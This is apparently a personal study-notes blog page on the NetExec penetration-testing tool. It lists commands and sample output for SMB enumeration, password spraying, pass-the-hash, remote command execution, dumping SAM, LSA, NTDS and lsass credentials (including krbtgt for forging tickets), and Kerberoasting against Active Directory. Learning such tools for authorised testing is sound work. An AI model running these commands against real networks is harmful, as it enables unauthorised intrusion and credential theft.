---
title: "NetExec Tool Overview"
description: "My notes for the [Netexec](https://github.com/Pennyw0rth/NetExec) tool"
date: 2024-01-22T10:00:00+01:00
image: https://cloud.githubusercontent.com/assets/5151193/17577511/d312ceb4-5f3b-11e6-8de5-8822246289fd.jpg
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Windows
    - Privilege Escalation
    - Enumeration
categories:
    - Tool
    - Active Directory
---

Enumeration:

```bash
nxc smb -h
```

```bash
nxc smb <URL>
SMB <URL> 445  DC-DC [*] Windows 10.0 Build 20348 x64 (name: DC-DC) (domain: dc.local) (signing: True) (SMBv1:False)
```

Name: PC’s name

domain: domain’s name

SMBv1:True (Possible Eternal Blue exploit)

Check for acounts:

```bash
nxc smb <URL> -u 'guest' -p ''

SMB   <URL>   445   DC-DC   [*] Windows 10.0 Build 20348 x64 (name: DC-DC) (domain: dc.local) (signing: True) (SMBv1:False)
SMB   <URL>   445   DC-DC   [-] dc.local\guest: STATUS_ACCOUNT_DISABLED
```

With a file:

```bash
nxc smb <URL> -u 'usern.name' -p 'password_file.txt'
```

```bash
SMB   <URL>   445   DC-DC   [*] Windows 10.0 Build 20348 x64 (name: DC-DC) (domain: dc. local) (signing:True) (SMBv1:False)
SMB   <URL>   445   DC-DC   [-] dc.local\name.surname:password STATUS_LOGON_FAILURE
SMB   <URL>   445   DC-DC   [-] dc.local\name.surname:Password123 STATUS_LOGON_FAILURE
SMB   <URL>   445   DC-DC   [-] dc.local\name.surname:Summer2023! STATUS_LOGON_FAILURE
SMB   <URL>   445   DC-DC   [+] dc. local\name.surname:SeekTheCheapestRoute!
```

Pass the password:

```bash
nxc smb <URL> -u 'user_file.txt' -p '<found_password>'
```

With credentials: (enumerate users and groups)

```bash
nxc smb <URL> -u 'user.name' -p 'found_password' --rid-brute
```

With`--log` you can log a specific command to a specific file

config file:

```bash
/home/kali/.nxc/nxc.conf
[nxc]
workspace = default
last_used_db = smb
pwn3d_label = Pwn3d!
audit_mode =
reveal_chars_of_pwd = 0
log_mode = False <--- if True generates log in the "/home/kali/.nxc/logs" folder
ignore_opsec = True
host_info_colors = ["green", "red", "yellow", "cyan"]

[BloodHound]
bh_enabled = False
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = neo4j

[Empire]
api_host = 127.0.0.1
api_port = 1337
username = empireadmin
password = password123

[Metasploit]
rpc_host = 127.0.0.1
rpc_port = 55552
password = abc123
```

Kerberos Auth:

```bash
nxc smb <URL> -u 'user.name' -p 'found_password' -k
```

If you have a tgt ticket:

```bash
export KRB5CCNAME=ticket.ccache
nxc smb <URL> -u 'user.name' -p 'found_password' --use-kcache
```

Execute commands:

```bash
nxc smb <URL> -u 'user.name' -p 'found_password' -x 'command' <--- cmd
nxc smb <URL> -u 'user.name' -p 'found_password' -X 'command' <--- Powershell
nxc smb <URL> -u 'user.name' -p 'found_password' -x 'powershell.exe -c "GCI C:\\"' <--- Powershell without obfuscation
```

If you got admin the first thing to do is dump the sam/lsa:

```bash
nxc smb <URL> -u 'Administrator' -p 'admin_pass' --sam
```

```bash
nxc smb <URL> -u 'Administrator' -p 'admin_pass' --lsa
```

Auth with Hash:

```bash
nxc smb <URL> -u 'USER-DC$' -H <hash>
```

PC name needed.

ntds dump:

```bash
nxc smb <URL> -u 'USER-DC$' -H <hash> --ntds
```

ntds dump of a single user: (better krbtgt)

```bash
nxc smb <URL> -u 'USER-DC$' -H <hash> --ntds --user krbtgt
```

With the hash of the krbtgt we can forge our own tickets.

Modules:

```bash
nxc smb <URL> -u 'Administrator' -p 'admin_pass' -M nanodump
```

Get lsass dump and parse the result with pypykatz

```bash
nxc smb <URL> -u 'Administrator' -p 'admin_pass' -M lsassy
```

Dumps lsass and parse the result remotely with lsassy

Put files in the smb share:

```bash
nxc smb <URL> -u 'Administrator' -p 'admin_pass' --put-file file.txt '\\file.txt'
```

### LDAP

```bash
nxc ldap -L <--list modules
```

Kerberoast:

```bash
nxc ldap <URL> -u 'Administrator' -p 'admin_pass' --kerberoasting outfile.txt
```
